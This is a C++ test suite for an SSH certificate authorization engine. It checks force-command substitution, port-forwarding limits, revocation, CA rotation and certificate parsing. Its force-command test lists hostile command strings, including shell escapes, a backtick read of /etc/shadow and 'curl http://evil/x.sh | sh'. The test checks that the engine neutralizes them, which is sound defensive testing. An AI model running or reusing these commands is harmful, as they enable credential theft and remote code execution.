#include <cstdio>
#include <memory>
#include <string>

#include "cert_builder.hpp"
#include "netsec.hpp"

using namespace netsec;
using namespace netsec::testutil;

namespace {

int g_failures = 0;
int g_checks = 0;

void check(bool condition, const char* expression, const char* file,
           int line) {
    ++g_checks;
    if (!condition) {
        ++g_failures;
        std::fprintf(stderr, "FAIL %s:%d: %s\n", file, line, expression);
    }
}

#define CHECK(cond) check((cond), #cond, __FILE__, __LINE__)

// Verifier that rejects a chosen CA key, simulating a bad cryptographic
// signature while remaining deterministic and dependency-free.
class RejectingVerifier final : public ICertificateVerifier {
public:
    explicit RejectingVerifier(std::string rejectedCaKey)
        : rejectedCaKey_(std::move(rejectedCaKey)) {}

    bool verify(const SshCertificate& certificate,
                const std::string& caKeyBlob) const override {
        return !samePublicKey(caKeyBlob, rejectedCaKey_) &&
               !certificate.signature.empty();
    }

private:
    std::string rejectedCaKey_;
};

struct Fixture {
    std::shared_ptr<TrustStore> store = std::make_shared<TrustStore>();
    std::string caKey = makeKeyBlob("primary-ca");
    static constexpr std::uint64_t kNow = 1500;

    Fixture() {
        store->addTrustedCa(TrustedCa{caKey, {}});
    }

    ConstraintEngine engine(const ICertificateVerifier* verifier = nullptr) {
        return ConstraintEngine(store, verifier);
    }
};

ChannelRequest sessionRequest(std::string command = "", bool pty = false) {
    ChannelRequest request;
    request.type = ChannelType::Session;
    request.requestedCommand = std::move(command);
    request.requestsPty = pty;
    return request;
}

ChannelRequest forwardingRequest(ChannelType type, std::string host,
                                 std::string port) {
    ChannelRequest request;
    request.type = type;
    request.targetHost = std::move(host);
    request.targetPort = std::move(port);
    return request;
}

}  // namespace

int main() {
    // ---- Parsing: unknown critical option rejects the certificate ----------
    {
        Fixture f;
        std::string blob = CertBuilder()
                               .principal("alice")
                               .criticalOption("force-command",
                                               "/usr/bin/backup")
                               .criticalOption("bastion-role", "admin")
                               .caKey(f.caKey)
                               .build();
        AuthenticationResult result =
            f.engine().authenticate(blob, "alice", "10.0.0.5", f.kNow);
        CHECK(!result.decision.allowed);
        CHECK(result.decision.reason == DenyReason::UnknownCriticalOption);
        CHECK(result.session == nullptr);

        // Unknown extensions are advisory and must not reject.
        std::string extOnly = CertBuilder()
                                  .principal("alice")
                                  .extension("custom-audit", "on")
                                  .caKey(f.caKey)
                                  .build();
        AuthenticationResult extResult =
            f.engine().authenticate(extOnly, "alice", "10.0.0.5", f.kNow);
        CHECK(extResult.decision.allowed);
        CHECK(extResult.session != nullptr);
        CHECK(extResult.session->certificate().extensions.unknown.size() == 1);
    }

    // ---- Force-command: command substitution cannot escape -----------------
    {
        Fixture f;
        std::string blob = CertBuilder()
                               .principal("alice")
                               .criticalOption("force-command",
                                               "/usr/bin/backup --daily")
                               .caKey(f.caKey)
                               .build();
        AuthenticationResult result =
            f.engine().authenticate(blob, "alice", "10.0.0.5", f.kNow);
        CHECK(result.decision.allowed);
        auto session = result.session;
        CHECK(session != nullptr);

        const std::string attacks[] = {
            "/bin/bash",
            "/usr/bin/backup --daily; /bin/sh",
            "$(/usr/bin/id)",
            "`cat /etc/shadow`",
            "/usr/bin/backup --daily && curl http://evil/x.sh | sh",
        };
        for (const std::string& attack : attacks) {
            AuthzDecision channel =
                session->openChannel(sessionRequest(attack), f.kNow);
            CHECK(channel.allowed);
            CHECK(channel.effectiveCommand == "/usr/bin/backup --daily");
            CHECK(channel.originalCommand == attack);
        }

        // An interactive shell request is likewise replaced, never honored.
        AuthzDecision shell =
            session->openChannel(sessionRequest(""), f.kNow);
        CHECK(shell.allowed);
        CHECK(shell.effectiveCommand == "/usr/bin/backup --daily");
        CHECK(shell.originalCommand.empty());
    }

    // ---- Legitimate restricted command keeps working ----------------------
    {
        Fixture f;
        std::string blob = CertBuilder()
                               .principal("svc")
                               .criticalOption("force-command",
                                               "/opt/bin/healthcheck")
                               .criticalOption("permit-pty")
                               .caKey(f.caKey)
                               .build();
        AuthenticationResult result =
            f.engine().authenticate(blob, "svc", "10.0.0.9", f.kNow);
        CHECK(result.decision.allowed);

        AuthzDecision pty = result.session->openChannel(
            sessionRequest("/opt/bin/healthcheck", true), f.kNow);
        CHECK(pty.allowed);
        CHECK(pty.effectiveCommand == "/opt/bin/healthcheck");

        // Without permit-pty, a pty request on a forced-command cert fails.
        std::string noPty = CertBuilder()
                                .principal("svc")
                                .criticalOption("force-command",
                                                "/opt/bin/healthcheck")
                                .caKey(f.caKey)
                                .build();
        AuthenticationResult noPtyAuth =
            f.engine().authenticate(noPty, "svc", "10.0.0.9", f.kNow);
        AuthzDecision deniedPty = noPtyAuth.session->openChannel(
            sessionRequest("/opt/bin/healthcheck", true), f.kNow);
        CHECK(!deniedPty.allowed);
        CHECK(deniedPty.reason == DenyReason::PtyNotPermitted);
    }

    // ---- Port forwarding and permit-open ----------------------------------
    {
        Fixture f;
        std::string restricted =
            CertBuilder()
                .principal("alice")
                .criticalOption("permit-port-forwarding")
                .criticalOption("permit-open", "db.internal:5432")
                .criticalOption("permit-listen", "127.0.0.1:8080")
                .caKey(f.caKey)
                .build();
        AuthenticationResult result =
            f.engine().authenticate(restricted, "alice", "10.0.0.5", f.kNow);
        CHECK(result.decision.allowed);
        auto session = result.session;

        AuthzDecision allowed = session->openChannel(
            forwardingRequest(ChannelType::DirectTcpIp, "db.internal", "5432"),
            f.kNow);
        CHECK(allowed.allowed);

        AuthzDecision wrongHost = session->openChannel(
            forwardingRequest(ChannelType::DirectTcpIp, "evil.example", "5432"),
            f.kNow);
        CHECK(!wrongHost.allowed);
        CHECK(wrongHost.reason == DenyReason::ForwardingTargetDenied);

        AuthzDecision wrongPort = session->openChannel(
            forwardingRequest(ChannelType::DirectTcpIp, "db.internal", "22"),
            f.kNow);
        CHECK(!wrongPort.allowed);
        CHECK(wrongPort.reason == DenyReason::ForwardingTargetDenied);

        AuthzDecision listenOk = session->openChannel(
            forwardingRequest(ChannelType::TcpIpForward, "127.0.0.1", "8080"),
            f.kNow);
        CHECK(listenOk.allowed);

        AuthzDecision listenDenied = session->openChannel(
            forwardingRequest(ChannelType::TcpIpForward, "0.0.0.0", "8080"),
            f.kNow);
        CHECK(!listenDenied.allowed);
        CHECK(listenDenied.reason == DenyReason::ForwardingTargetDenied);

        // A cert without any forwarding grant cannot open a direct channel.
        std::string noFwd = CertBuilder()
                                .principal("alice")
                                .criticalOption("force-command", "/bin/true")
                                .caKey(f.caKey)
                                .build();
        AuthenticationResult noFwdAuth =
            f.engine().authenticate(noFwd, "alice", "10.0.0.5", f.kNow);
        AuthzDecision fwdDenied = noFwdAuth.session->openChannel(
            forwardingRequest(ChannelType::DirectTcpIp, "db.internal", "5432"),
            f.kNow);
        CHECK(!fwdDenied.allowed);
        CHECK(fwdDenied.reason == DenyReason::ForwardingNotPermitted);

        // Agent and X11 channels default-deny without their grants.
        AuthzDecision agentDenied = session->openChannel(
            forwardingRequest(ChannelType::AuthAgent, "", ""), f.kNow);
        CHECK(agentDenied.reason == DenyReason::AgentForwardingNotPermitted);
        AuthzDecision x11Denied = session->openChannel(
            forwardingRequest(ChannelType::X11, "", ""), f.kNow);
        CHECK(x11Denied.reason == DenyReason::X11NotPermitted);
    }

    // ---- Multiplexing: every channel re-evaluates the same constraints ----
    {
        Fixture f;
        std::string blob = CertBuilder()
                               .principal("alice")
                               .criticalOption("force-command",
                                               "/usr/bin/backup")
                               .caKey(f.caKey)
                               .build();
        AuthenticationResult result =
            f.engine().authenticate(blob, "alice", "10.0.0.5", f.kNow);
        auto session = result.session;

        // Many multiplexed session channels over one transport: the forced
        // command applies to each, and forwarding stays forbidden throughout.
        for (int i = 0; i < 5; ++i) {
            AuthzDecision channel =
                session->openChannel(sessionRequest("/bin/sh"), f.kNow);
            CHECK(channel.allowed);
            CHECK(channel.effectiveCommand == "/usr/bin/backup");
        }
        AuthzDecision fwd = session->openChannel(
            forwardingRequest(ChannelType::DirectTcpIp, "host", "22"),
            f.kNow);
        CHECK(!fwd.allowed);
        CHECK(fwd.reason == DenyReason::ForwardingNotPermitted);
    }

    // ---- Rekey: host-key rotation is ignored, revocation kills session -----
    {
        Fixture f;
        std::string blob = CertBuilder()
                               .serial(77)
                               .principal("alice")
                               .criticalOption("force-command",
                                               "/usr/bin/backup")
                               .caKey(f.caKey)
                               .build();
        AuthenticationResult result =
            f.engine().authenticate(blob, "alice", "10.0.0.5", f.kNow);
        auto session = result.session;
        CHECK(session->valid());

        // Host-key rotation must not alter user authorization.
        std::string newHostKey = makeKeyBlob("rotated-host-key");
        AuthzDecision rekey = session->onRekey(newHostKey, f.kNow);
        CHECK(rekey.allowed);
        CHECK(session->valid());

        // Revocation between rekeys takes effect on the next rekey.
        std::uint64_t previousGeneration =
            session->lastEvaluatedGeneration();
        f.store->revoke(77);
        CHECK(f.store->generation() > previousGeneration);
        AuthzDecision rekeyAfterRevoke =
            session->onRekey(newHostKey, f.kNow);
        CHECK(!rekeyAfterRevoke.allowed);
        CHECK(rekeyAfterRevoke.reason == DenyReason::Revoked);
        CHECK(rekeyAfterRevoke.invalidateSession);
        CHECK(!session->valid());
        CHECK(session->invalidReason() == DenyReason::Revoked);

        // A dead session stays dead: later channel opens are refused.
        AuthzDecision later =
            session->openChannel(sessionRequest("/bin/sh"), f.kNow);
        CHECK(!later.allowed);
        CHECK(later.reason == DenyReason::Revoked);

        // A brand-new connection presenting the revoked serial is rejected.
        AuthenticationResult newConnection =
            f.engine().authenticate(blob, "alice", "10.0.0.5", f.kNow);
        CHECK(!newConnection.decision.allowed);
        CHECK(newConnection.decision.reason == DenyReason::Revoked);
        CHECK(newConnection.session == nullptr);
    }

    // ---- Revocation between multiplexed channels --------------------------
    {
        Fixture f;
        std::string blob = CertBuilder()
                               .serial(88)
                               .principal("bob")
                               .criticalOption("force-command",
                                               "/usr/bin/backup")
                               .caKey(f.caKey)
                               .build();
        AuthenticationResult result =
            f.engine().authenticate(blob, "bob", "10.0.0.5", f.kNow);
        auto session = result.session;

        CHECK(session->openChannel(sessionRequest(), f.kNow).allowed);
        f.store->revoke(88);
        AuthzDecision afterRevoke =
            session->openChannel(sessionRequest(), f.kNow);
        CHECK(!afterRevoke.allowed);
        CHECK(afterRevoke.reason == DenyReason::Revoked);
        CHECK(!session->valid());
    }

    // ---- CA, principal, validity window and source address ----------------
    {
        Fixture f;

        // Untrusted CA.
        std::string rogueCa = makeKeyBlob("rogue-ca");
        std::string rogueBlob =
            CertBuilder().principal("alice").caKey(rogueCa).build();
        AuthenticationResult untrusted =
            f.engine().authenticate(rogueBlob, "alice", "10.0.0.5", f.kNow);
        CHECK(!untrusted.decision.allowed);
        CHECK(untrusted.decision.reason == DenyReason::UntrustedCa);

        // Principal mismatch.
        std::string aliceBlob =
            CertBuilder().principal("alice").caKey(f.caKey).build();
        AuthenticationResult wrongPrincipal = f.engine().authenticate(
            aliceBlob, "mallory", "10.0.0.5", f.kNow);
        CHECK(wrongPrincipal.decision.reason ==
              DenyReason::PrincipalMismatch);

        // Validity window (valid_before is exclusive).
        std::string timed = CertBuilder()
                                .principal("alice")
                                .validity(1000, 2000)
                                .caKey(f.caKey)
                                .build();
        CHECK(f.engine().authenticate(timed, "alice", "10.0.0.5", 999)
                  .decision.reason == DenyReason::NotYetValid);
        CHECK(f.engine().authenticate(timed, "alice", "10.0.0.5", 1000)
                  .decision.allowed);
        CHECK(f.engine().authenticate(timed, "alice", "10.0.0.5", 1999)
                  .decision.allowed);
        CHECK(f.engine().authenticate(timed, "alice", "10.0.0.5", 2000)
                  .decision.reason == DenyReason::Expired);

        // Source-address: CIDR matching for IPv4 and IPv6, bracket form too.
        std::string sourced =
            CertBuilder()
                .principal("alice")
                .criticalOption("source-address",
                                "10.0.0.0/24,2001:db8::/32")
                .caKey(f.caKey)
                .build();
        CHECK(f.engine().authenticate(sourced, "alice", "10.0.0.99", f.kNow)
                  .decision.allowed);
        CHECK(f.engine().authenticate(sourced, "alice", "10.0.1.1", f.kNow)
                  .decision.reason == DenyReason::SourceAddressDenied);
        CHECK(f.engine()
                  .authenticate(sourced, "alice", "2001:db8::1", f.kNow)
                  .decision.allowed);
        CHECK(f.engine()
                  .authenticate(sourced, "alice", "2001:db9::1", f.kNow)
                  .decision.reason == DenyReason::SourceAddressDenied);
        CHECK(f.engine()
                  .authenticate(sourced, "alice", "[2001:db8::2]:51512",
                                f.kNow)
                  .decision.allowed);
        CHECK(f.engine()
                  .authenticate(sourced, "alice", "10.0.0.7:51512", f.kNow)
                  .decision.allowed);

        // Host certificates cannot authenticate a user.
        std::string hostCert =
            CertBuilder().hostCertificate().principal("alice").build();
        CHECK(f.engine()
                  .authenticate(hostCert, "alice", "10.0.0.5", f.kNow)
                  .decision.reason == DenyReason::NotUserCertificate);
    }

    // ---- CA rotation and CA-scoped principals -----------------------------
    {
        auto store = std::make_shared<TrustStore>();
        std::string caA = makeKeyBlob("ca-a");
        std::string caB = makeKeyBlob("ca-b");
        store->addTrustedCa(TrustedCa{caA, {"alice"}});

        std::string blobA =
            CertBuilder().serial(1).principal("alice").caKey(caA).build();
        std::string blobB =
            CertBuilder().serial(2).principal("alice").caKey(caB).build();

        ConstraintEngine engine(store);
        CHECK(engine.authenticate(blobA, "alice", "10.0.0.1", 1500)
                  .decision.allowed);
        CHECK(engine.authenticate(blobB, "alice", "10.0.0.1", 1500)
                  .decision.reason == DenyReason::UntrustedCa);

        // Rotate trust: retire CA A, introduce CA B. Existing sessions bound
        // to A detect the rotation on their next channel open / rekey.
        auto session =
            engine.authenticate(blobA, "alice", "10.0.0.1", 1500).session;
        store->removeTrustedCa(caA);
        store->addTrustedCa(TrustedCa{caB, {"alice"}});
        AuthzDecision rotated = session->reevaluate(1500);
        CHECK(!rotated.allowed);
        CHECK(rotated.reason == DenyReason::UntrustedCa);
        CHECK(engine.authenticate(blobB, "alice", "10.0.0.1", 1500)
                  .decision.allowed);

        // A CA restricted to one principal cannot certify another.
        std::string blobOther = CertBuilder()
                                    .principal("mallory")
                                    .caKey(caB)
                                    .build();
        CHECK(engine.authenticate(blobOther, "mallory", "10.0.0.1", 1500)
                  .decision.reason == DenyReason::PrincipalMismatch);
    }

    // ---- Injected cryptographic verifier ----------------------------------
    {
        Fixture f;
        std::string blob =
            CertBuilder().principal("alice").caKey(f.caKey).build();
        RejectingVerifier verifier(f.caKey);
        AuthenticationResult result = f.engine(&verifier).authenticate(
            blob, "alice", "10.0.0.5", f.kNow);
        CHECK(!result.decision.allowed);
        CHECK(result.decision.reason == DenyReason::BadSignature);

        // A broken signature blob fails the certificate before authorization.
        std::string broken = CertBuilder()
                                 .principal("alice")
                                 .malformedSignature()
                                 .caKey(f.caKey)
                                 .build();
        AuthenticationResult brokenResult =
            f.engine().authenticate(broken, "alice", "10.0.0.5", f.kNow);
        CHECK(!brokenResult.decision.allowed);
        CHECK(brokenResult.decision.reason ==
              DenyReason::MalformedCertificate);
    }

    // ---- Wire round-trip and malformed input ------------------------------
    {
        Fixture f;
        std::string blob =
            CertBuilder()
                .serial(42)
                .principal("alice")
                .principal("backup")
                .validity(1200, 3400)
                .criticalOption("force-command", "/usr/bin/backup")
                .criticalOption("permit-open", "db.internal:5432")
                .extension("permit-agent-forwarding")
                .caKey(f.caKey)
                .build();
        CertificateParseResult parsed = parseCertificate(blob);
        CHECK(static_cast<bool>(parsed));
        const SshCertificate& cert = *parsed.certificate;
        CHECK(cert.serial == 42);
        CHECK(cert.type == CertificateType::User);
        CHECK(cert.principals.size() == 2);
        CHECK(cert.validAfter == 1200 && cert.validBefore == 3400);
        CHECK(cert.critical.forceCommand == "/usr/bin/backup");
        CHECK(cert.critical.permitOpen.size() == 1);
        CHECK(cert.critical.permitOpen[0].host == "db.internal");
        CHECK(cert.critical.permitOpen[0].port == "5432");
        CHECK(cert.critical.sourceAddresses.empty());
        CHECK(cert.extensions.permitAgentForwarding);
        CHECK(cert.signatureKey == f.caKey);
        CHECK(cert.rawCertificate == blob);

        CertificateParseResult truncated = parseCertificate(
            std::string_view("\x00\x00\x00\x05" "abc"));
        CHECK(!static_cast<bool>(truncated));

        CertificateParseResult empty = parseCertificate(std::string_view{});
        CHECK(!static_cast<bool>(empty));

        // Malformed source-address / permit-open fail the parse.
        std::string badSource = CertBuilder()
                                    .principal("alice")
                                    .criticalOption("source-address",
                                                    "not-an-ip")
                                    .build();
        CHECK(!static_cast<bool>(parseCertificate(badSource)));

        std::string badOpen = CertBuilder()
                                  .principal("alice")
                                  .criticalOption("permit-open",
                                                  "db.internal:notaport")
                                  .build();
        CHECK(!static_cast<bool>(parseCertificate(badOpen)));
    }

    std::printf("%d checks, %d failures\n", g_checks, g_failures);
    return g_failures == 0 ? 0 : 1;
}
